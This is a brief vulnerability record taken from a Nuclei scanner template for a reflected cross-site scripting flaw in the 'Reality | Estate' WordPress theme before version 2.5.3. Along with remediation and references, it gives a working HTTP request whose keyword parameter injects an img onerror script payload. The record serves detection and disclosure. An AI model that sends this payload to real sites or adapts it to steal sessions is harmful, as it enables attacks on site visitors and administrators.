# Nuclei Template: Reality Estate Multipurpose WP-Theme < 2.5.3 - Cross-Site Scripting
**Template ID:** wp-reality-estate-theme
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-reality-estate-theme.yaml`)

## Vulnerability Information & PoC

## Description
Reflected XSS was discovered in the 'Reality | Estate Multipurpose WordPress Theme'.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22
```

## Remediation
update to v.2.5.3

## References
- https://wpscan.com/vulnerability/10064
- https://www.exploitalert.com/view-details.html?id=34777
